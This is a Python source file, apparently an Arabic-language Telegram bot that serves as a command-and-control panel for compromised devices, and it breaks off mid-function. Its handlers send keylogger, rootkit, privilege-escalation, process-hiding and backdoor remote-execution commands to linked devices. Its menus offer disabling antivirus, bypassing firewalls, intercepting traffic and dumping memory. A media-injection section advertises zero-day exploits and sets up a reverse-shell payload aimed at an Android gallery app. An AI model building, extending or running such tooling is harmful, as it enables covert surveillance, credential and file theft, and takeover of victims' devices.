        bot.reply_to(message, "📋 أوامر خوارزمية تسجيل المفاتيح:\n\n"
                             "`/keylogger start` - بدء تسجيل المفاتيح\n"
                             "`/keylogger stop` - إيقاف تسجيل المفاتيح\n"
                             "`/keylogger data` - الحصول على البيانات المسجلة")
        return

    action = command_parts[1].lower()
    
    if action == 'start':
        command_id = device_manager.save_command(user_id, device_id, 'keylogger_start')
        result = command_executor.send_command(device_id, 'keylogger_start')
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, "⌨️ تم بدء خوارزمية تسجيل المفاتيح")
            device_manager.update_command_result(command_id, 'sent')
            
    elif action == 'stop':
        command_id = device_manager.save_command(user_id, device_id, 'keylogger_stop')
        result = command_executor.send_command(device_id, 'keylogger_stop')
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, "⏹️ تم إيقاف خوارزمية تسجيل المفاتيح")
            device_manager.update_command_result(command_id, 'sent')
            
    elif action == 'data':
        command_id = device_manager.save_command(user_id, device_id, 'keylogger_get_data')
        result = command_executor.send_command(device_id, 'keylogger_get_data')
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, "📊 جاري الحصول على البيانات المسجلة...")
            device_manager.update_command_result(command_id, 'sent')
    else:
        bot.reply_to(message, "❌ أمر غير صحيح. استخدم `/keylogger` للمساعدة.")

    device_manager.log_activity(user_id, 'keylogger_control', f'device_id: {device_id}, action: {action}')


@bot.message_handler(commands=['rootkit'])
def control_rootkit(message):
    """التحكم في Rootkit"""
    user_id = message.from_user.id

    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return

    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    pending_devices = [d for d in devices if d[1] == 'pending']

    if not active_devices and not pending_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
        return

    # استخدام جهاز نشط أو تفعيل جهاز معلق
    if active_devices:
        device_id = active_devices[0][0]
        status = "نشط"
    else:
        device_id = pending_devices[0][0]
        # تفعيل الجهاز المعلق
        if force_device_activation(device_id):
            status = "تم تفعيله"
        else:
            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
            return

    # تحليل الأمر
    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "📋 أوامر Rootkit:\n\n"
                             "`/rootkit install` - تثبيت Rootkit\n"
                             "`/rootkit escalate` - تصعيد الصلاحيات\n"
                             "`/rootkit hide` - إخفاء العمليات")
        return

    action = command_parts[1].lower()
    
    if action == 'install':
        command_id = device_manager.save_command(user_id, device_id, 'rootkit_install')
        result = command_executor.send_command(device_id, 'rootkit_install')
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, "🔧 تم تثبيت Rootkit بنجاح")
            device_manager.update_command_result(command_id, 'sent')
            
    elif action == 'escalate':
        command_id = device_manager.save_command(user_id, device_id, 'rootkit_escalate')
        result = command_executor.send_command(device_id, 'rootkit_escalate')
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, "🔑 تم تصعيد الصلاحيات بنجاح")
            device_manager.update_command_result(command_id, 'sent')
            
    elif action == 'hide':
        command_id = device_manager.save_command(user_id, device_id, 'rootkit_hide')
        result = command_executor.send_command(device_id, 'rootkit_hide')
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, "👻 تم إخفاء العمليات بنجاح")
            device_manager.update_command_result(command_id, 'sent')
    else:
        bot.reply_to(message, "❌ أمر غير صحيح. استخدم `/rootkit` للمساعدة.")

    device_manager.log_activity(user_id, 'rootkit_control', f'device_id: {device_id}, action: {action}')


@bot.message_handler(commands=['backdoor'])
def control_backdoor(message):
    """التحكم في Backdoor"""
    user_id = message.from_user.id

    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return

    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    pending_devices = [d for d in devices if d[1] == 'pending']

    if not active_devices and not pending_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
        return

    # استخدام جهاز نشط أو تفعيل جهاز معلق
    if active_devices:
        device_id = active_devices[0][0]
        status = "نشط"
    else:
        device_id = pending_devices[0][0]
        # تفعيل الجهاز المعلق
        if force_device_activation(device_id):
            status = "تم تفعيله"
        else:
            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
            return

    # تحليل الأمر
    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "📋 أوامر Backdoor:\n\n"
                             "`/backdoor create` - إنشاء Backdoor\n"
                             "`/backdoor execute <command>` - تنفيذ أمر عن بعد\n"
                             "`/backdoor transfer` - نقل الملفات")
        return

    action = command_parts[1].lower()
    
    if action == 'create':
        command_id = device_manager.save_command(user_id, device_id, 'backdoor_create')
        result = command_executor.send_command(device_id, 'backdoor_create')
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, "🚪 تم إنشاء Backdoor بنجاح")
            device_manager.update_command_result(command_id, 'sent')
            
    elif action == 'execute':
        if len(command_parts) < 3:
            bot.reply_to(message, "❌ يرجى تحديد الأمر المراد تنفيذه.\nمثال: `/backdoor execute whoami`")
            return
            
        command_to_execute = ' '.join(command_parts[2:])
        command_id = device_manager.save_command(user_id, device_id, 'backdoor_execute', json.dumps({'command': command_to_execute}))
        result = command_executor.send_command(device_id, 'backdoor_execute', {'command': command_to_execute})
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, f"⚡ تم إرسال الأمر: `{command_to_execute}`")
            device_manager.update_command_result(command_id, 'sent')
            
    elif action == 'transfer':
        command_id = device_manager.save_command(user_id, device_id, 'backdoor_transfer')
        result = command_executor.send_command(device_id, 'backdoor_transfer')
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, "📁 تم بدء نقل الملفات")
            device_manager.update_command_result(command_id, 'sent')
    else:
        bot.reply_to(message, "❌ أمر غير صحيح. استخدم `/backdoor` للمساعدة.")

    device_manager.log_activity(user_id, 'backdoor_control', f'device_id: {device_id}, action: {action}')


@bot.message_handler(commands=['advanced'])
def advanced_commands(message):
    """معالجة الأوامر المتقدمة"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    # التحقق من الصلاحية
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    # التحقق من حد الطلبات
    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # الحصول على الجهاز المستهدف
    device_id, status = get_target_device(user_id, message)
    if not device_id:
        return

    # التحقق من اتصال الجهاز
    if not check_device_connection(device_id):
        bot.reply_to(message, "❌ الجهاز غير متصل حالياً.")
        return

    # تحليل الأمر
    command_parts = message.text.split()
    if len(command_parts) < 2:
        help_text = """
🚀 *الأوامر المتقدمة - التحكم الكامل:*

🔧 *أوامر النظام المتقدمة:*
• `/advanced system info` - معلومات النظام التفصيلية
• `/advanced system execute "command"` - تنفيذ أمر نظام
• `/advanced system bypass` - تجاوز قيود النظام
• `/advanced system elevate` - رفع الصلاحيات

📁 *أوامر الملفات المتقدمة:*
• `/advanced file read "path"` - قراءة ملف
• `/advanced file write "path" "content"` - كتابة ملف
• `/advanced file delete "path"` - حذف ملف
• `/advanced file list "directory"` - قائمة الملفات
• `/advanced file search "pattern"` - البحث في الملفات

🌐 *أوامر الشبكة المتقدمة:*
• `/advanced network intercept` - اعتراض حركة المرور
• `/advanced network bypass` - تجاوز الجدار الناري
• `/advanced network monitor` - مراقبة الشبكة
• `/advanced network inject` - حقن البيانات

🔒 *أوامر تجاوز الأمان:*
• `/advanced security disable_av` - تعطيل مكافح الفيروسات
• `/advanced security hide_process` - إخفاء العمليات
• `/advanced security bypass_firewall` - تجاوز الجدار الناري
• `/advanced security stealth_mode` - وضع التخفي

💾 *أوامر الذاكرة المتقدمة:*
• `/advanced memory read "address"` - قراءة الذاكرة
• `/advanced memory write "address" "data"` - كتابة الذاكرة
• `/advanced memory dump` - تفريغ الذاكرة

🔧 *أوامر السجل المتقدمة:*
• `/advanced registry read "key"` - قراءة السجل
• `/advanced registry write "key" "value"` - كتابة السجل
• `/advanced registry delete "key"` - حذف من السجل

⚙️ *أوامر العمليات المتقدمة:*
• `/advanced process list` - قائمة العمليات
• `/advanced process kill "pid"` - إنهاء عملية
• `/advanced process hide "pid"` - إخفاء عملية

📱 *أوامر الجهاز المتقدمة:*
• `/advanced device info` - معلومات الجهاز
• `/advanced device control` - التحكم الكامل
• `/advanced device bypass` - تجاوز القيود

🔧 *مثال الاستخدام:*
`/advanced system info` - معلومات النظام
`/advanced file read "C:/Windows/system32/config.ini"`
`/advanced security disable_av` - تعطيل مكافح الفيروسات

⚠️ *تحذير:* هذه الأوامر تتطلب صلاحيات إدارية عالية وتجاوز الأمان.
        """
        bot.reply_to(message, help_text, parse_mode='Markdown')
        return

    # تحليل الأمر المتقدم
    command_type = command_parts[1].lower()
    action = command_parts[2].lower() if len(command_parts) > 2 else ""
    parameters = " ".join(command_parts[3:]) if len(command_parts) > 3 else ""
    
    # معالجة الأوامر المتقدمة
    if command_type == 'system':
        handle_advanced_system_command(message, device_id, action, parameters)
    elif command_type == 'file':
        handle_advanced_file_command(message, device_id, action, parameters)
    elif command_type == 'network':
        handle_advanced_network_command(message, device_id, action, parameters)
    elif command_type == 'security':
        handle_advanced_security_command(message, device_id, action, parameters)
    elif command_type == 'memory':
        handle_advanced_memory_command(message, device_id, action, parameters)
    elif command_type == 'registry':
        handle_advanced_registry_command(message, device_id, action, parameters)
    elif command_type == 'process':
        handle_advanced_process_command(message, device_id, action, parameters)
    elif command_type == 'device':
        handle_advanced_device_command(message, device_id, action, parameters)
    else:
        bot.reply_to(message, "❌ نوع أمر غير معروف. استخدم `/advanced` للمساعدة.")

    device_manager.log_activity(user_id, 'advanced_command', f'device_id: {device_id}, type: {command_type}, action: {action}')

@bot.message_handler(commands=['media_injection'])
def media_injection_command(message):
    """أمر حقن الوسائط المتقدم"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    # التحقق من الصلاحية
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    # التحقق من حد الطلبات
    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # الحصول على الجهاز المستهدف
    device_id, status = get_target_device(user_id, message)
    if not device_id:
        return

    # التحقق من اتصال الجهاز
    if not check_device_connection(device_id):
        bot.reply_to(message, "❌ الجهاز غير متصل حالياً.")
        return

    # تحليل الأمر
    command_parts = message.text.split()
    if len(command_parts) < 2:
        help_text = """
💉 *أمر حقن الوسائط المتقدم - أقوى الثغرات والأدوات:*

📤 *رفع الوسائط:*
• `/media_injection upload` - رفع وسائط للحقن
• `/media_injection inject file_path` - حقن وسائط محددة

📊 *حالة الحقن:*
• `/media_injection status` - حالة الحقن الحالي
• `/media_injection logs` - سجلات الحقن
• `/media_injection stats` - إحصائيات الحقن

🎯 *التحكم:*
• `/media_injection execute injection_id` - تنفيذ حقن
• `/media_injection cancel injection_id` - إلغاء حقن
• `/media_injection targets` - الأهداف المتاحة

🔧 *الإعدادات:*
• `/media_injection config` - إعدادات الحقن
• `/media_injection test` - اختبار الاتصال

💻 *الميزات المتقدمة:*
• Zero-Day Exploits - استغلال الثغرات الجديدة
• Advanced Steganography - التمويه المتقدم
• Polymorphic Code - الكود المتغير الشكل
• Anti-Detection - تجاوز الكشف
• Memory Injection - الحقن في الذاكرة
• Process Hollowing - تجويف العمليات
• DLL Hijacking - اختطاف المكتبات
• Privilege Escalation - رفع الصلاحيات

⚠️ *تحذير:* هذا النظام يستخدم أقوى الثغرات والأدوات المتقدمة.
        """
        bot.reply_to(message, help_text, parse_mode='Markdown')
        return

    # تحليل الأمر المتقدم
    command_type = command_parts[1].lower()
    action = command_parts[2].lower() if len(command_parts) > 2 else ""
    parameters = " ".join(command_parts[3:]) if len(command_parts) > 3 else ""
    
    # معالجة أوامر حقن الوسائط
    if command_type == 'upload':
        handle_media_upload(message, device_id)
    elif command_type == 'inject':
        handle_media_injection(message, device_id, parameters)
    elif command_type == 'status':
        handle_media_status(message, device_id)
    elif command_type == 'logs':
        handle_media_logs(message, device_id)
    elif command_type == 'stats':
        handle_media_stats(message, device_id)
    elif command_type == 'execute':
        handle_media_execute(message, device_id, action)
    elif command_type == 'cancel':
        handle_media_cancel(message, device_id, action)
    elif command_type == 'targets':
        handle_media_targets(message, device_id)
    elif command_type == 'config':
        handle_media_config(message, device_id)
    elif command_type == 'test':
        handle_media_test(message, device_id)
    else:
        bot.reply_to(message, "❌ نوع أمر غير معروف. استخدم `/media_injection` للمساعدة.")

    device_manager.log_activity(user_id, 'media_injection_command', f'device_id: {device_id}, type: {command_type}, action: {action}')

def handle_advanced_system_command(message, device_id, action, parameters):
    """معالجة أوامر النظام المتقدمة"""
    try:
        processing_msg = bot.reply_to(message, "🔄 جاري تنفيذ أمر النظام المتقدم...")
        
        # تحليل المعاملات
        params = advanced_command_parser.parse_parameters(parameters)
        
        result = advanced_command_executor.execute_system_control(device_id, action, params)
        
        if result.get('success'):
            response_text = f"✅ تم تنفيذ أمر النظام المتقدم بنجاح\n\n"
            response_text += f"📋 النتيجة:\n{result.get('data', 'تم التنفيذ بنجاح')}"
        else:
            response_text = f"❌ فشل في تنفيذ أمر النظام المتقدم\n\n"
            response_text += f"🔍 السبب:\n{result.get('error', 'خطأ غير معروف')}"
        
        bot.edit_message_text(
            response_text,
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ في معالجة أمر النظام المتقدم: {str(e)}")

def handle_advanced_file_command(message, device_id, action, parameters):
    """معالجة أوامر الملفات المتقدمة"""
    try:
        processing_msg = bot.reply_to(message, "🔄 جاري تنفيذ أمر الملفات المتقدم...")
        
        # تحليل المعاملات
        params = advanced_command_parser.parse_parameters(parameters)
        file_path = params.get('file_path') or params.get('value', '')
        content = params.get('content', '')
        
        result = advanced_command_executor.execute_file_control(device_id, action, file_path, content)
        
        if result.get('success'):
            response_text = f"✅ تم تنفيذ أمر الملفات المتقدم بنجاح\n\n"
            response_text += f"📋 النتيجة:\n{result.get('data', 'تم التنفيذ بنجاح')}"
        else:
            response_text = f"❌ فشل في تنفيذ أمر الملفات المتقدم\n\n"
            response_text += f"🔍 السبب:\n{result.get('error', 'خطأ غير معروف')}"
        
        bot.edit_message_text(
            response_text,
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ في معالجة أمر الملفات المتقدم: {str(e)}")

def handle_advanced_network_command(message, device_id, action, parameters):
    """معالجة أوامر الشبكة المتقدمة"""
    try:
        processing_msg = bot.reply_to(message, "🔄 جاري تنفيذ أمر الشبكة المتقدم...")
        
        # تحليل المعاملات
        params = advanced_command_parser.parse_parameters(parameters)
        
        result = advanced_command_executor.execute_network_control(device_id, action, params)
        
        if result.get('success'):
            response_text = f"✅ تم تنفيذ أمر الشبكة المتقدم بنجاح\n\n"
            response_text += f"📋 النتيجة:\n{result.get('data', 'تم التنفيذ بنجاح')}"
        else:
            response_text = f"❌ فشل في تنفيذ أمر الشبكة المتقدم\n\n"
            response_text += f"🔍 السبب:\n{result.get('error', 'خطأ غير معروف')}"
        
        bot.edit_message_text(
            response_text,
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ في معالجة أمر الشبكة المتقدم: {str(e)}")

def handle_advanced_security_command(message, device_id, action, parameters):
    """معالجة أوامر تجاوز الأمان المتقدمة"""
    try:
        processing_msg = bot.reply_to(message, "🔄 جاري تنفيذ أمر تجاوز الأمان المتقدم...")
        
        # تحليل المعاملات
        params = advanced_command_parser.parse_parameters(parameters)
        
        result = advanced_command_executor.execute_security_bypass(device_id, action, params)
        
        if result.get('success'):
            response_text = f"✅ تم تنفيذ أمر تجاوز الأمان المتقدم بنجاح\n\n"
            response_text += f"📋 النتيجة:\n{result.get('data', 'تم التنفيذ بنجاح')}"
        else:
            response_text = f"❌ فشل في تنفيذ أمر تجاوز الأمان المتقدم\n\n"
            response_text += f"🔍 السبب:\n{result.get('error', 'خطأ غير معروف')}"
        
        bot.edit_message_text(
            response_text,
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ في معالجة أمر تجاوز الأمان المتقدم: {str(e)}")

def handle_advanced_memory_command(message, device_id, action, parameters):
    """معالجة أوامر الذاكرة المتقدمة"""
    try:
        processing_msg = bot.reply_to(message, "🔄 جاري تنفيذ أمر الذاكرة المتقدم...")
        
        # تحليل المعاملات
        params = advanced_command_parser.parse_parameters(parameters)
        address = params.get('address') or params.get('value', '')
        data = params.get('data', '')
        
        result = advanced_command_executor.execute_memory_control(device_id, action, address, data)
        
        if result.get('success'):
            response_text = f"✅ تم تنفيذ أمر الذاكرة المتقدم بنجاح\n\n"
            response_text += f"📋 النتيجة:\n{result.get('data', 'تم التنفيذ بنجاح')}"
        else:
            response_text = f"❌ فشل في تنفيذ أمر الذاكرة المتقدم\n\n"
            response_text += f"🔍 السبب:\n{result.get('error', 'خطأ غير معروف')}"
        
        bot.edit_message_text(
            response_text,
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ في معالجة أمر الذاكرة المتقدم: {str(e)}")

def handle_advanced_registry_command(message, device_id, action, parameters):
    """معالجة أوامر السجل المتقدمة"""
    try:
        processing_msg = bot.reply_to(message, "🔄 جاري تنفيذ أمر السجل المتقدم...")
        
        # تحليل المعاملات
        params = advanced_command_parser.parse_parameters(parameters)
        key = params.get('key') or params.get('value', '')
        value = params.get('value', '')
        
        result = advanced_command_executor.execute_registry_control(device_id, action, key, value)
        
        if result.get('success'):
            response_text = f"✅ تم تنفيذ أمر السجل المتقدم بنجاح\n\n"
            response_text += f"📋 النتيجة:\n{result.get('data', 'تم التنفيذ بنجاح')}"
        else:
            response_text = f"❌ فشل في تنفيذ أمر السجل المتقدم\n\n"
            response_text += f"🔍 السبب:\n{result.get('error', 'خطأ غير معروف')}"
        
        bot.edit_message_text(
            response_text,
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ في معالجة أمر السجل المتقدم: {str(e)}")

def handle_advanced_process_command(message, device_id, action, parameters):
    """معالجة أوامر العمليات المتقدمة"""
    try:
        processing_msg = bot.reply_to(message, "🔄 جاري تنفيذ أمر العمليات المتقدم...")
        
        # تحليل المعاملات
        params = advanced_command_parser.parse_parameters(parameters)
        process_id = params.get('process_id') or params.get('value', '')
        
        result = advanced_command_executor.execute_process_control(device_id, action, process_id)
        
        if result.get('success'):
            response_text = f"✅ تم تنفيذ أمر العمليات المتقدم بنجاح\n\n"
            response_text += f"📋 النتيجة:\n{result.get('data', 'تم التنفيذ بنجاح')}"
        else:
            response_text = f"❌ فشل في تنفيذ أمر العمليات المتقدم\n\n"
            response_text += f"🔍 السبب:\n{result.get('error', 'خطأ غير معروف')}"
        
        bot.edit_message_text(
            response_text,
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ في معالجة أمر العمليات المتقدم: {str(e)}")

def handle_advanced_device_command(message, device_id, action, parameters):
    """معالجة أوامر الجهاز المتقدمة"""
    try:
        processing_msg = bot.reply_to(message, "🔄 جاري تنفيذ أمر الجهاز المتقدم...")
        
        # تحليل المعاملات
        params = advanced_command_parser.parse_parameters(parameters)
        
        result = advanced_command_executor.execute_device_control(device_id, action, params)
        
        if result.get('success'):
            response_text = f"✅ تم تنفيذ أمر الجهاز المتقدم بنجاح\n\n"
            response_text += f"📋 النتيجة:\n{result.get('data', 'تم التنفيذ بنجاح')}"
        else:
            response_text = f"❌ فشل في تنفيذ أمر الجهاز المتقدم\n\n"
            response_text += f"🔍 السبب:\n{result.get('error', 'خطأ غير معروف')}"
        
        bot.edit_message_text(
            response_text,
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ في معالجة أمر الجهاز المتقدم: {str(e)}")

@bot.message_handler(commands=['system'])
def control_system(message):
    """التحكم في النظام"""
    user_id = message.from_user.id

    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return

    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    pending_devices = [d for d in devices if d[1] == 'pending']

    if not active_devices and not pending_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
        return

    # استخدام جهاز نشط أو تفعيل جهاز معلق
    if active_devices:
        device_id = active_devices[0][0]
        status = "نشط"
    else:
        device_id = pending_devices[0][0]
        # تفعيل الجهاز المعلق
        if force_device_activation(device_id):
            status = "تم تفعيله"
        else:
            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
            return

    # تحليل الأمر
    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "📋 أوامر النظام:\n\n"
                             "`/system info` - معلومات النظام\n"
                             "`/system control <action>` - التحكم في النظام\n"
                             "`/system monitor` - مراقبة النظام")
        return

    action = command_parts[1].lower()
    
    if action == 'info':
        command_id = device_manager.save_command(user_id, device_id, 'system_info')
        result = command_executor.send_command(device_id, 'system_info')
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, "💻 جاري الحصول على معلومات النظام...")
            device_manager.update_command_result(command_id, 'sent')
            
    elif action == 'control':
        if len(command_parts) < 3:
            bot.reply_to(message, "❌ يرجى تحديد الإجراء المراد تنفيذه.\nمثال: `/system control shutdown`")
            return
            
        system_action = command_parts[2].lower()
        command_id = device_manager.save_command(user_id, device_id, 'system_control', json.dumps({'action': system_action}))
        result = command_executor.send_command(device_id, 'system_control', {'action': system_action})
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, f"🎮 تم إرسال إجراء النظام: `{system_action}`")
            device_manager.update_command_result(command_id, 'sent')
            
    elif action == 'monitor':
        command_id = device_manager.save_command(user_id, device_id, 'system_monitor')
        result = command_executor.send_command(device_id, 'system_monitor')
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, "📊 جاري بدء مراقبة النظام...")
            device_manager.update_command_result(command_id, 'sent')
    else:
        bot.reply_to(message, "❌ أمر غير صحيح. استخدم `/system` للمساعدة.")

    device_manager.log_activity(user_id, 'system_control', f'device_id: {device_id}, action: {action}')


# معالجة الرسائل النصية
# معالج الأزرار التفاعلية
@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call):
    """معالجة الأزرار التفاعلية"""
    try:
        if call.data == "devices_menu":
            show_devices_menu(call.message)
        elif call.data == "link_device":
            show_link_device_menu(call.message)
        elif call.data == "contacts_menu":
            show_contacts_menu(call.message)
        elif call.data == "sms_menu":
            show_sms_menu(call.message)
        elif call.data == "media_menu":
            show_media_menu(call.message)
        elif call.data == "location_menu":
            show_location_menu(call.message)
        elif call.data == "screenshot_menu":
            show_screenshot_menu(call.message)
        elif call.data == "record_menu":
            show_record_menu(call.message)
        elif call.data == "mic_record_menu":
            show_mic_record_menu(call.message)
        elif call.data == "keylogger_menu":
            show_keylogger_menu(call.message)
        elif call.data == "advanced_attacks_menu":
            show_advanced_attacks_menu(call.message)
        elif call.data == "media_injection_menu":
            show_media_injection_menu(call.message)
        elif call.data == "bypass_menu":
            show_bypass_menu(call.message)
        elif call.data == "system_control_menu":
            show_system_control_menu(call.message)
        elif call.data == "tools_menu":
            show_tools_menu(call.message)
        elif call.data == "stats_menu":
            show_stats_menu(call.message)
        elif call.data == "help_menu":
            show_help_menu(call.message)
        elif call.data == "settings_menu":
            show_settings_menu(call.message)
        elif call.data == "back_to_main":
            send_welcome(call.message)
        else:
            # معالجة الأوامر الفرعية
            handle_submenu_callback(call)
            
    except Exception as e:
        bot.answer_callback_query(call.id, f"❌ خطأ: {str(e)}")
        logger.error(f"خطأ في معالجة الأزرار: {e}")

@bot.message_handler(func=lambda message: True)
def handle_text_message(message):
    """معالجة الرسائل النصية"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    # التحقق من وجود أمر في قائمة الانتظار
    if user_id in command_queue:
        pending_command = command_queue[user_id]
        if time.time() - pending_command['timestamp'] > 300:
            del command_queue[user_id]
            bot.reply_to(message, "⏰ انتهت مهلة التأكيد. يرجى إعادة الأمر.")
            return

    bot.reply_to(message, "💡 استخدم الأوامر المتاحة. اكتب `/help` للمساعدة.")



# وظيفة تنظيف دوري
def cleanup_old_sessions():
    """تنظيف الجلسات القديمة"""
    while True:
        try:
            current_time = time.time()

            # تنظيف الجلسات المنتهية
            expired_sessions = [
                user_id for user_id, session_data in active_sessions.items()
                if current_time - session_data['timestamp'] > SECURITY_CONFIG['session_timeout']
            ]

            for user_id in expired_sessions:
                del active_sessions[user_id]

            # تنظيف أوامر الانتظار المنتهية
            expired_commands = [
                user_id for user_id, command_data in command_queue.items()
                if current_time - command_data['timestamp'] > 300  # 5 دقائق
            ]

            for user_id in expired_commands:
                del command_queue[user_id]

            time.sleep(60)  # تنظيف كل دقيقة

        except Exception as e:
            logger.error(f"خطأ في تنظيف الجلسات: {e}")
            time.sleep(60)

# بدء خيط التنظيف
cleanup_thread = threading.Thread(target=cleanup_old_sessions, daemon=True)
cleanup_thread.start()

# إعداد المستخدمين المصرح لهم
setup_authorized_users()

# دوال معالجة أوامر حقن الوسائط
def handle_media_upload(message, device_id):
    """معالجة رفع الوسائط للحقن المتقدم"""
    try:
        bot.reply_to(message, "📤 جاري إعداد رفع الوسائط للحقن المتقدم...")
        
        # استيراد نظام حقن الوسائط المتقدم
        from advanced_media_injection import AdvancedMediaInjection
        from advanced_media_injection_v3 import AdvancedMediaInjectionV3
        from advanced_media_injection_v4 import AdvancedMediaInjectionV4
        from media_injection_api import MediaInjectionAPI
        from media_injection_api_v3 import MediaInjectionAPIV3
        from media_injection_api_v4 import AdvancedMediaInjectionAPIV4
        from media_injection_database import MediaInjectionDatabase
        from media_injection_config import ADVANCED_SECURITY_CONFIG, ZERO_DAY_EXPLOITS_CONFIG
        
        # إنشاء معرف فريد للحقن
        injection_id = f"injection_{int(time.time())}_{secrets.token_hex(8)}"
        
        # إنشاء مثيلات الأنظمة المتقدمة
        media_injection = AdvancedMediaInjection()
        api_client = MediaInjectionAPI()
        database = MediaInjectionDatabase()
        
        # إعداد بيانات الحقن المتقدمة
        injection_data = {
            'injection_id': injection_id,
            'device_id': device_id,
            'target_app': 'com.android.gallery3d',  # Gallery افتراضياً
            'media_type': 'image',
            'payload_type': 'reverse_shell',
            'encryption_key': secrets.token_hex(32),
            'obfuscation_level': 5,
